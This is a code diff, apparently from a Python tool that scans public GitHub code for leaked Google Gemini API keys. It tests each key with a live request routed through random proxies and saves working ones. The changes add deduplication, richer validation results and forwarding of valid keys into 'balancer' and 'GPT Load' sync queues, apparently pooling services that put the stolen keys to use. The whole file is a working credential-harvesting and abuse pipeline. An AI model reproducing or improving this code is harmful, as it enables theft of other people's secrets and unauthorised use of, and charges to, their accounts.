@@ -3,6 +3,7 @@ import random
 import re
 import sys
 import time
+import traceback
 from datetime import datetime, timedelta
 from typing import Dict, List, Union, Any
 
@@ -13,12 +14,12 @@ from common.Logger import logger
 
 sys.path.append('../')
 from common.config import Config
-from utils.github_utils import GitHubUtils
-from utils.file_manager import FileManager, Checkpoint
+from utils.github_client import GitHubClient
+from utils.file_manager import file_manager, Checkpoint, checkpoint
+from utils.sync_utils import sync_utils
 
 # 创建GitHub工具实例和文件管理器
-github_utils = GitHubUtils.create_instance(Config.GITHUB_TOKENS)
-file_manager = FileManager(Config.DATA_PATH)
+github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)
 
 # 统计信息
 skip_stats = {
@@ -157,7 +158,9 @@ def process_item(item: Dict[str, Any]) -> tuple:
             if "..." in snippet or "YOUR_" in snippet.upper():
                 continue
         filtered_keys.append(key)
-    keys = filtered_keys
+    
+    # 去重处理
+    keys = list(set(filtered_keys))
 
     if not keys:
         return 0, 0
@@ -170,7 +173,7 @@ def process_item(item: Dict[str, Any]) -> tuple:
     # 验证每个密钥
     for key in keys:
         validation_result = validate_gemini_key(key)
-        if "ok" in validation_result:
+        if validation_result and "ok" in validation_result:
             valid_keys.append(key)
             logger.info(f"✅ VALID: {key}")
         elif validation_result == "rate_limited":
@@ -183,6 +186,13 @@ def process_item(item: Dict[str, Any]) -> tuple:
     if valid_keys:
         file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
         logger.info(f"💾 Saved {len(valid_keys)} valid key(s)")
+        # 添加到同步队列（不阻塞主流程）
+        try:
+            # 添加到两个队列
+            sync_utils.add_keys_to_queue(valid_keys)
+            logger.info(f"📥 Added {len(valid_keys)} key(s) to sync queues")
+        except Exception as e:
+            logger.error(f"📥 Error adding keys to sync queues: {e}")
 
     if rate_limited_keys:
         file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)
@@ -195,17 +205,27 @@ def validate_gemini_key(api_key: str) -> Union[bool, str]:
     try:
         time.sleep(random.uniform(0.5, 1.5))
 
+        # 获取随机代理配置
+        proxy_config = Config.get_random_proxy()
+        
+        client_options = {
+            "api_endpoint": "generativelanguage.googleapis.com"
+        }
+        
+        # 如果有代理配置，添加到client_options中
+        if proxy_config:
+            os.environ['grpc_proxy'] = proxy_config.get('http')
+
         genai.configure(
             api_key=api_key,
-            transport="rest",
-            client_options={"api_endpoint": "generativelanguage.googleapis.com"},
+            client_options=client_options,
         )
 
         model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
         response = model.generate_content("hi")
         return "ok"
     except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated) as e:
-        return False
+        return "not_authorized_key"
     except google_exceptions.TooManyRequests as e:
         return "rate_limited"
     except Exception as e:
@@ -214,7 +234,7 @@ def validate_gemini_key(api_key: str) -> Union[bool, str]:
         elif "403" in str(e) or "SERVICE_DISABLED" in str(e) or "API has not been used" in str(e):
             return "disabled"
         else:
-            return "error"
+            return f"error:{e.__class__.__name__}"
 
 
 def print_skip_stats():
@@ -241,13 +261,21 @@ def main():
 
     # 1. 检查配置
     if not Config.check():
-        logger.error("❌ Configuration check failed. Exiting...")
-        logger.info("You can create GitHub tokens at: https://github.com/settings/tokens")
+        logger.info("❌ Config check failed. Exiting...")
         sys.exit(1)
     # 2. 检查文件管理器
     if not file_manager.check():
         logger.error("❌ FileManager check failed. Exiting...")
         sys.exit(1)
+
+    # 2.5. 显示SyncUtils状态和队列信息
+    if sync_utils.balancer_enabled:
+        logger.info("🔗 SyncUtils ready for async key syncing")
+        
+    # 显示队列状态
+    balancer_queue_count = len(checkpoint.wait_send_balancer)
+    gpt_load_queue_count = len(checkpoint.wait_send_gpt_load)
+    logger.info(f"📊 Queue status - Balancer: {balancer_queue_count}, GPT Load: {gpt_load_queue_count}")
 
     # 3. 显示系统信息
     search_queries = file_manager.get_search_queries()
@@ -255,11 +283,9 @@ def main():
     logger.info(f"🔑 GitHub tokens: {len(Config.GITHUB_TOKENS)} configured")
     logger.info(f"🔍 Search queries: {len(search_queries)} loaded")
     logger.info(f"📅 Date filter: {Config.DATE_RANGE_DAYS} days")
-    if Config.PROXY:
-        logger.info(f"🌐 Proxy: {Config.PROXY}")
+    if Config.PROXY_LIST:
+        logger.info(f"🌐 Proxy: {len(Config.PROXY_LIST)} proxies configured")
 
-    # 4. 加载checkpoint并显示状态
-    checkpoint = file_manager.load_checkpoint()
     if checkpoint.last_scan_time:
         logger.info(f"💾 Checkpoint found - Incremental scan mode")
         logger.info(f"   Last scan: {checkpoint.last_scan_time}")
@@ -364,9 +390,12 @@ def main():
             checkpoint.update_scan_time()
             file_manager.save_checkpoint(checkpoint)
             logger.info(f"📊 Final stats - Valid keys: {total_keys_found}, Rate limited: {total_rate_limited_keys}")
+            logger.info("🔚 Shutting down sync utils...")
+            sync_utils.shutdown()
             break
         except Exception as e:
             logger.error(f"💥 Unexpected error: {e}")
+            traceback.print_exc()
             logger.info("🔄 Continuing...")
             continue
 
